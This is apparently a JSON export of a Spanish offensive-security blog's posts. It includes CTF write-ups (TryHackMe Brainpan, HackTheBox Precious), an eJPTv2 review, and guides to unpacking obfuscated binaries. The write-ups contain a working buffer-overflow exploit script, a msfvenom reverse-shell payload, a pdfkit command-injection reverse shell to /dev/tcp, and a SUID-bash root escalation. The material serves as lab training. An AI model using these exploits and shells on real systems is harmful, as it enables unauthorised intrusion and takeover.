\u0026#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9\u0026#34; postfix = \u0026#34;\u0026#34; buffer = prefix + overflow + retn + padding + payload + postfix s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: s.connect((ip, port)) print(\u0026#34;Sending evil buffer...\u0026#34;) s.send(bytes(buffer + \u0026#34;\\r\\n\u0026#34;, \u0026#34;latin-1\u0026#34;)) print(\u0026#34;Done!\u0026#34;) except: print(\u0026#34;Could not connect.\u0026#34;) Con mona encontramos el offset del EIP.\n!mona findmsp -distance 600 EIP contains normal pattern : 0x33724132 (offset 518) Editamos el script.\noffset = 518 retn \u0026#34;BBBB\u0026#34; Como podemos ver el EIP ha cambiado su valor a “42424242” que es “BBBB”.\nBuscamos los bad characters.\n!mona bytearray -b \u0026#34;\\x00\u0026#34; ESP\u0026gt;FOLLOW IN DUMP, vemos que todos los carácteres están de forma correcta y no hay ninguno que sea \u0026ldquo;malo\u0026rdquo;, tan sólo usaremos el carácter \u0026ldquo;\\x00\u0026rdquo; ya que es un null byte y en la mayoría de los casos no está admiitido.\nCon mona llamamos a los módulos con la siguiente sintaxis:\n!mona modules Como podemos ver no tiene protecciones de memoria.\npor lo tanto los aplicamos a la variable \u0026ldquo;retn\u0026rdquo; junto a los Nops (padding).\nimport socket ip = \u0026#34;10.10.83.134\u0026#34; port = 9999 timeout = 5 prefix = \u0026#34;\u0026#34; offset = 524 # EIP padding = \u0026#34;\\x90\u0026#34; * 20 # No operation retn = \u0026#34;\\xf3\\x12\\x17\\x31\u0026#34; # JMP ESP Creamos un payload y lo pegamos en su variable, nos ponemos en esucha con nc.\nmsfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.37.230 LPORT=4444 EXITFUNC=thread -b \u0026#34;\\x00\u0026#34; -f python nc -lvnp 4444 Escalada de privilegios # puck@brainpan:/home$ puck@brainpan:/home$ sudo -l Matching Defaults entries for puck on this host: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User puck may run the following commands on this host: (root) NOPASSWD: /home/anansi/bin/anansi_util Vemos que ejecutandolo nos permite poner en manual de cualquier binario , por lo tanto si llamamos al binario bash, y escrbimios !/bin/bash tendremos una shell de root.\n","date":"29 May 2023","permalink":"/posts/brainpan-thm/","section":"Posts","summary":"Resolución de la Máquina Brainpan de dificultad díficil de TryHackMe abordando Buffer overflow.","title":"Write Up Brainpan"},{"content":"¡Hola a todos!, hace una semana hice el examen de eLearnSecurity y vengo a contaros mi experiencia en cuanto a dificultad y contenidos.\n¿Vale la pena? # Si estás iniciándote el mundo del pentesting como yo, te diría que si, a mi me ha servido mucho, porque al ser el primer examen al que me presento iba con miedo debido a qué no sabia a que me enfrentaba y así ya me puedo ir haciendo una idea. Yo no hice el curso de INE, tengo hecha una considerable batería de máquinas de TryHackMe y HackTheBox , además de estar cursando un Bootcamp que me ha permitido adquirir los conocimientos correspondientes de redes, Linux y Windows. Por este motivo yo recomendaría hacer el curso para poder realizar el examen con éxito, ya que se dan temas importantes para dicha prueba, aunque para acelerar el proceso puedes omitir los módulos de programación, puesto que el examen no se centra demasiado en esa parte.\n¿Cómo definirías su dificultad? # En mi opinión el examen me ha resultado fácil, pero hay que tener muy en cuenta la organización y saber enumerar muy bien, te puedes abrumar si no llevas una organización correcta. El examen tiene una duración de 48 horas y tienes tiempo de sobra para hacerle, por lo tanto no hay prisa , debes ir con calma y apuntando todo lo que ves, eso es lo más importante. El examen es en un navegador sin conexión, por lo tanto no puedes instalar herramientas.\n¿Qué repasar para ese momento? # Los temas que puedes abarcar son los siguientes:\nIP route (con metasploit también) Wireshark Host Discovery Fuzzing Fuerza bruta Explotación Básica SQLi XSS Burpsuite Metasploit Redes Fundamentos Linux/Windows ¿Cómo es el examen? # El examen está compuesto por 35 preguntas, 30 de ellas son tipo test, las demás suelen ser preguntas cortas que se responden a medida que se va haciendo el examen.\nTips # No es un CTF, a mí me pasó varias veces y pensé en lo difícil, pero es mucho más fácil.\nBusca siempre dos formas de hacer las cosas para que no se te escape nada.\nSe puede usar cualquier herramienta automática, ya que no están prohibidas.\nMáquinas que pueden ser útiles para practicar: # Vulnet Internal (THM) Game Zone (THM) ColddBox (THM) Cap (HTB) Validation (HTB) Wekor (Sin escalada) (THM) Blog (THM) ","date":"13 May 2023","permalink":"/posts/ejptv2-review/","section":"Posts","summary":"Recientemente me he sacado la certificación eJPTv2, ¿qué tan difícil es?, ¿merece la pena pagar por esta certificación?","title":"eJPTv2 Review"},{"content":"Tipo de Ofuscación # Comenzamos mirando la ofuscación que tiene la aplicación.\nDejamos corriendo el ejecutable y abrimos un volcador de archivos para eliminar la protección de enigma.\nClick Derecho sobre la aplicación y elegimos la opción \u0026ldquo;Dump Selected Process\u0026rdquo;.\nNos crea una carpeta llamada \u0026ldquo;Dumps\u0026rdquo;, vamos a comprobar de nuevo la obfuscación con un detector, con de4dot nos indica que es confuser , pero vamos a hacer un escaneo más complejo para ver que es ConfuserEX.\nde4dot: Detect it easy: Análisis y desempaquetado # Ahora vamos abrir DnSpy para verlo de forma más profunda, como podemos observar está obfuscado por ConfuserEX. Debemos ir al módulo \u0026ldquo;main\u0026rdquo;.\nUna vez que hemos entrado en el módulo main debemos buscar la palabra \u0026ldquo;koi\u0026rdquo; (Es como un módulo que guarda toda la información sobre la aplicación en concreto), hacemos click sobre \u0026ldquo;LoadModule\u0026rdquo;.\nAñadimos un punto de ruptura en el método \u0026ldquo;return\u0026rdquo;.\nVolvemos a ir al .exe y inciamos la depuración.\nNos genera un modulo raw, lo guardamos con click derecho como .exe\nComo podemos ver se ha desempaquetado completamente.\nCódigo limpio: # ","date":"23 April 2023","permalink":"/posts/unpack-confuserex/","section":"Posts","summary":"Desempaquetado de un Archivo \u0026ldquo;.exe\u0026rdquo; ofuscado con ConfuserEx y Enigma.NET.","title":"Unpack ConfuserEx \u0026 Enigma"},{"content":"Tipo de ofuscación # Comenzamos mirando que tipo de obfuscación lleva el archivo.\nDesempaquetado # Utilizamos la herramienta pyinstxtractor.\npython pyinstxtractor.py natif.exe [+] Processing natif.exe [+] Pyinstaller version: 2.1+ [+] Python version: 3.10 [+] Length of package: 873288 bytes [+] Found 9 files in CArchive [+] Beginning extraction...please standby [+] Possible entry point: pyiboot01_bootstrap.pyc [+] Possible entry point: pyi_rth_inspect.pyc [+] Possible entry point: natif.pyc [+] Found 97 files in PYZ archive [+] Successfully extracted pyinstaller archive: natif.exe Obtenemos una carpeta llamada \u0026ldquo;natif.exe_extracted\u0026rdquo;, podemos ver que tenemos un archivo .pyc que está compilado.\nUsaremos la herramienta pydc, Adjunto el repositorio y su instalación.\nRepositorio:\nhttps://github.com/zrax/pycdc Instalación:\ncd pycdc cmake . make make check Procedemos con su uso. Ya ha sido eliminada la obfuscación de pyinstaller, solo quedaría eliminar la de pyarmor.\n./pycdc natif.pyc \u0026gt; natif.py Veamos como eliminamos esta protección.\ncat natif.py ───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: natif.py ───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ # Source Generated with Decompyle++ 2 │ # File: natif.pyc (Python 3.10) 3 │ 4 │ from pyarmor_runtime_000000 import __pyarmor__ 5 │ __pyarmor__(__name__, __file__, b\u0026#39;PY000000\\x00\\x03\\x0b\\x00\\xa7\\r\\r\\n\\x80\\x00\\x01\\x00\\x08\\x00\\x00\\x00\\x04\\x00\\x00\\x00@\\x00\\x00\\x00\\xde\\x02\\x00\\x00\\x12\\t\\x04\\x00\\xe8\\ │ x12\\x1be\\xac73Z\\x03\\xaf\\x19\\xa3\\xae\\x9f\\xa4z\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00F\\x97Ea\\xcc\\xa8 \\x7f\\x82g6\\\u0026#39;\\xd1\\x8dB=J\\x08?\\xe8/\\xdc\\x0b\\x10\\xb1\\x9f\\x9d\\xf4\\xf2j8\\xbeb │ \\xda\\x84\\xc7kE\\xed*J\\x08+\\xb4f\\xa4\\x7fU\\xdb|Z\\xbb?7f\\xd8\\xc5\\xd5\\xb6z9\\xf5\\xabq\\x83\\xbe\\xd1Wn\\x16\\x05\\x19\\xdb\\xbb\\xed\\xa3\\xcd@2\\xce\\xf5\\xfa\\xcapS`u\\xfe\\xd5\\x08cb\\xc │ 7a\\xa2\\x01\\xf7\\x99\\x80\\x8a{\\xe50\\xdf\\x9c\\xb7\\x10[:Yj\u0026amp;_\\x08|\\x86\\xbf\\x0b]G\\xf0KD\\xa8\\xd8/,\\x10,\\xa8M\\xfb\\xd3\\x9a9\\xd3\\xb1\\xce\\xca\\x91!h\\r\\x00\\x98\\xe9$\\x89\\xfe\\xdd\\x1 │ b\\x85b\\x9e\\xb7\\xb4\\xe9\\xee%\\xcf\\x95\\xa9\\x89+\u0026#34;}\\xdc\\xd7\\xa6u1\\x189\\x1c\\xbb\\xe1\\x8e\\x1b\\xbd\\xa6T\\xfb\\xc8\\x03\\xd2\\x86Z\\x1f\\x8f\\x8e:\\xe3\\xdcQ\\x19\\xca\\xbf)\\xbb\\xee\\x82O\\ │ x84\\x90a\\xaf\\x93\\xf8\\xd2\\x1e\\x1f\\xc1\\xa5\\x1cN\\x8b\\xbd\\xfa\\x01\\x977E\\xe2\\rJt\\x12@\\x8f\\xc1\\xe2\\x16l\\xcc\\x91R\\xb4\\x04]\\xc6\\xd0\\x0e\\x18\\x8ak\u0026#34;Y3\\x07|\\xfb\\xf5$\\xda\\x05\\xb │ 9\\x80h+\\xfei\\xf6\\x80\\xcb\\xe9\\x866\\x1f\\x98l\\xf8\\x88\\xe8\\x81u\\x9e\\xbe\\xf91]D\\xec\\xe2\\xba\\xba\\xeb\\xd1\\xfcqV\u0026amp;~G~\\xc0\\x98a\\xdc\\xaaN\u0026gt;\\x1aK\\xb86\\x1fT\\xdc\\xf2e\\x9e\\x1e\\x15\\ │ r\\xecc\\xc7o\\xb7\\xbc\\x86\\x13iM\\x15;\\xa4\\xed?\\x80\u0026amp;8p\\x81\\x1c\\xf3G)\\xe2\\xfd\\x82`Y\\x84\\xfdW\\x11\u0026#34;R\\xb2C\\xd8\\x17\\xcc\\xfc\\xda6\\xcf\\xe4\\x0b\\x16\\xdf\\x0e\\xe7F\\x04\\x1bsD\u0026amp;Q\\x93 │ \\x07\\x1d8L\\x7f\\t.\\x8b\\x87C\\xce\\x15e\\xa6TMZ\\x8d\\xa0\\xf9\\xcbl\\xf8\\xa8\\xa0\\xcb\\x1fs\\x9cP\\xff\\xcb\\xd7)\\x94\\x19\\xa3%\\x89\\x9c\\xd8\\x13\\xac\\xda@\\x10}\\xa8\\xf9[\\x17_\\xe5\\xe8\\ │ x9b\\x8bJ\\x0e\\x06y\\xac4A\\xc65*N\\x80\\xa2U\\xed\\x8c\\xf7\\x04R`\\xad7\\xc2J\\xe8\\xefv\\xfd\\xe3\\xd6^\\x9e\\xd5\\xdcW\\xe9Q7\\xa7\\xf4\\xc8\\xc7\\xa5\\xb7\\xfd\\x9fhE\\x8b \\x1dFz\\t\\x9d\\xfe\\ │ xb2j\\xef\\xca%\\xe2\\xe0\\x85+eF\\xafL\\x1c\\xee\\x0c\\xeal\\r\\x99\\x04d\\\\\\xc7\\xe6\\xa9\\xbc\\xefT\\x9a\\xdb\\xe9De\\x00\\xc9%\\t\\x08\\x82\\xe4\\x86\\xfb\\xe2\\xf9:\\x12\\xa4\\xe2\\xff\\xb6\\x93\\x │ dc\\x15\\x1c\\xc6c\\x15\\x97\\x0b\\xe5\\xe2\\xe9\\xac:Ns\\\\xg\\xc4B,\\x94\\xc3{:\\xcd\\xcf;q\\x9f\\x86\\xdfM\\x08U\\x9dLY}\\xcerH1\\x9e\\x0b\\xc5A\\xad\\xc1r)\\xdc\\xbf\\xb2Og.\\x0b\\xea\\xfd\\xc5\\x │ b6$Ez\\x1a\\x1d}w\\x99\\x1d\\xb4\\xec3\\x0c\\r]t\\xc4\\xde/\\x11\\x9c\\xbf*\\x01\\x1b\\x14\\xc2p:k\\xc2\\x168\\xa6$\\x85?Q[x\\x8b\\xccX\\xe3H\\xa7\\xd1\\xd7\\xf0)\\\\n_w\\x06X\\x049\\x92\\x06\\xee]\u0026gt;\\ │ x07\\x1f\u0026lt;\\x8f\\x0b\\x9f\\x1br\\xfc\\xbcQ\\x0c\\xefc\\x8b\\xe5\\xae\\xd3\\xe6u\\xd5#\\xc7\\x13\\x98\\x17\\x97|y\\xc8\\xb2\\xfe\\xd7osUzT\\xbf\\x87\\xcb\\xebe\\xcd\\x89\\x04[\\xc5\\xb7mA0e\\xbf\\xe8=\\ │ xfe\\xfc\\xb6O\\xc6\\x7fq\\x9d\\xbd\\xb1\\x9e\\xc4#\\xe4\\\\\\xb1\\x83\u0026#39;) Vamos a realizar un volcado de archivos con tal de obtener las credenciales.\nUtilizaremos un script llamado memdump.py\nVolcado de memoria # #! /usr/bin/env python3 import sys import re if __name__ == \u0026#34;__main__\u0026#34;: if len(sys.argv) != 2: print(\u0026#39;Usage:\u0026#39;, sys.argv[0], \u0026#39;\u0026lt;process PID\u0026gt;\u0026#39;, file=sys.stderr) exit(1) pid = sys.argv[1] # maps contains the mapping of memory of a specific project map_file = f\u0026#34;/proc/{pid}/maps\u0026#34; mem_file = f\u0026#34;/proc/{pid}/mem\u0026#34; # output file out_file = f\u0026#39;{pid}.dump\u0026#39; # iterate over regions with open(map_file, \u0026#39;r\u0026#39;) as map_f, open(mem_file, \u0026#39;rb\u0026#39;, 0) as mem_f, open(out_file, \u0026#39;wb\u0026#39;) as out_f: for line in map_f.readlines(): # for each mapped region m = re.match(r\u0026#39;([0-9A-Fa-f]+)-([0-9A-Fa-f]+) ([-r])\u0026#39;, line) if m.group(3) == \u0026#39;r\u0026#39;: # readable region start = int(m.group(1), 16) end = int(m.group(2), 16) mem_f.seek(start) # seek to region start print(hex(start), \u0026#39;-\u0026#39;, hex(end)) try: chunk = mem_f.read(end - start) # read region contents out_f.write(chunk) # dump contents to standard output except OSError: print(hex(start), \u0026#39;-\u0026#39;, hex(end), \u0026#39;[error,skipped]\u0026#39;, file=sys.stderr) continue print(f\u0026#39;Memory dump saved to {out_file}\u0026#39;) Iniciamos el proceso y lo dejamos ejecutando.\npython3 natif.py Mientras tanto veremos lo procesos. Es muy importante poner ese parámetro para poder ver los procesos padres y los hijos, nos fijamos en el segundo que es el PID.\nps -axjf Ahora vamos a realizar el volcado.\npython3 memdump.py \u0026lt;Number_PID\u0026gt; Debemos utilizar strings para poder extraer los datos legibles.\nExtracción de strings # strings \u0026lt;proceso.dump\u0026gt; \u0026gt; \u0026lt;proceso_legible.dump\u0026gt; Resultado: # python3 natif.py User: NatifLoop Password: Py4RmOrDeObfSCati0n Great! ","date":"16 April 2023","permalink":"/posts/unpack-pyarmor/","section":"Posts","summary":"Tipo de ofuscación # Comenzamos mirando que tipo de obfuscación lleva el archivo.","title":"Unpack Pyarmor \u0026 Pyinstaller"},{"content":"","date":null,"permalink":"/categories/hackthebox/","section":"Categories","summary":"","title":"HackTheBox"},{"content":"Enumeración # Empezamos escaneando los puertos.\nsudo nmap -sS --min-rate 5000 -p- -n -vvv 10.10.11.189 Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 22:33 CET Initiating Ping Scan at 22:33 Scanning 10.10.11.189 [4 ports] Completed Ping Scan at 22:33, 0.07s elapsed (1 total hosts) Initiating SYN Stealth Scan at 22:33 Scanning 10.10.11.189 [65535 ports] Discovered open port 22/tcp on 10.10.11.189 Discovered open port 80/tcp on 10.10.11.189 Completed SYN Stealth Scan at 22:33, 11.43s elapsed (65535 total ports) Nmap scan report for 10.10.11.189 Host is up, received echo-reply ttl 63 (0.11s latency). Scanned at 2023-03-03 22:33:13 CET for 11s Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Realizamos virtual hosting.\nsudo nano /etc/hosts \u0026lt;ip\u0026gt; \u0026lt;domain_name\u0026gt; Web # Podemos crear un servidor local y poniendo nuestra ip para ver si nos lista el directorio.\nEfectivamente nos muestra el directorio.\nHaremos un exiftool para obtener mas datos.\nNos fijamos en la versión, podemos ver si existe algun exploit.\nexiftool okdyddataifm1fyahvphc6a58hczocv7.pdf ExifTool Version Number : 12.56 File Name : okdyddataifm1fyahvphc6a58hczocv7.pdf Directory : . File Size : 33 kB File Modification Date/Time : 2023:03:03 22:45:19+01:00 File Access Date/Time : 2023:03:03 22:45:19+01:00 File Inode Change Date/Time : 2023:03:03 22:45:19+01:00 File Permissions : -rw-r--r-- File Type : PDF File Type Extension : pdf MIME Type : application/pdf PDF Version : 1.4 Linearized : No Page Count : 1 Creator : Generated by pdfkit v0.8.6 Podemos mandarnos una reverse shell.\nComenzamos creando un servidor \u0026gt; python3 -m http.server 9090 con un nc nos ponemos como escucha \u0026gt; nc -lvnp 9001 Reverse shell \u0026gt; http://10.10.16.9:8080/?name=#{\u0026#39;%20`bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.16.9/9001 \u0026lt;\u0026amp;1\u0026#39;`\u0026#39;} En el usuario \u0026ldquo;ruby\u0026rdquo; encontramos unas credenciales\nruby@precious:~$ cd .bundle cd .bundle ruby@precious:~/.bundle$ cat config cat config --- BUNDLE_HTTPS://RUBYGEMS__ORG/: \u0026#34;henry:Q3c1AqGHtoI0aXAYFH\u0026#34; ruby@precious:~/.bundle$ Por lo tanto podemos acceder por el ssh.\nssh henry@10.10.11.189 henry@precious:~$ cat user.txt ******************************* Escalada de privilegios # hacemos un sudo -l\nhenry@precious:/opt$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb Vamos a ver el script de ruby.\nhenry@precious:/opt$ cat update_dependencies.rb # Compare installed dependencies with those specified in \u0026#34;dependencies.yml\u0026#34; require \u0026#34;yaml\u0026#34; require \u0026#39;rubygems\u0026#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(\u0026#34;dependencies.yml\u0026#34;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts \u0026#34;Installed version differs from the one specified in file: \u0026#34; + local_name else puts \u0026#34;Installed version is equals to the one specified in file: \u0026#34; + local_name end end end end henry@precious:/opt$ Vemos que lee el siguiente archivo -\u0026gt; \u0026ldquo;dependencies.yml\u0026rdquo;. Primero ejecutamos el script.\nhenry@precious:/opt$ sudo /usr/bin/ruby opt/update_dependencies.rb [sudo] password for henry: Sorry, user henry is not allowed to execute \u0026#39;/usr/bin/ruby opt/update_dependencies.rb\u0026#39; as root on precious. Por lo tanto vamos a ver si podemos editarlo.\ngit_set: chmod u+s /bin/bash ls -al /bin/bash bash -p cd root \u0026amp;\u0026amp; cat root.txt **** ","date":"4 March 2023","permalink":"/posts/precious-htb/","section":"Posts","summary":"Resolución de la Máquina Precious de HackTheBox de dificultad fácil.","title":"Write Up Precious"},{"content":"Whoami # Hello! I\u0026rsquo;m Be4St 👋\nThis blog is dedicated to offensive cybersecurity, where I will upload articles about it, reverse engineering and programming which are topics that I am passionate about.\nHappy Hacking \u0026lt;3!\nCertifications # I have obtained two penetration testing certifications, they are as follows:\neCPPT (Certified Professional Penetration Tester)\neJPTv2 (Junior Penetration Tester)\nDeveloped tools # Script developed in python, to be able to generate reverse shells in a much faster way, it also encodes the shell syntaxes and listen in!\nShell2You.py ","date":null,"permalink":"/whoami/","section":"Be4St","summary":"Whoami # Hello!","title":""},{"content":"","date":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags"}]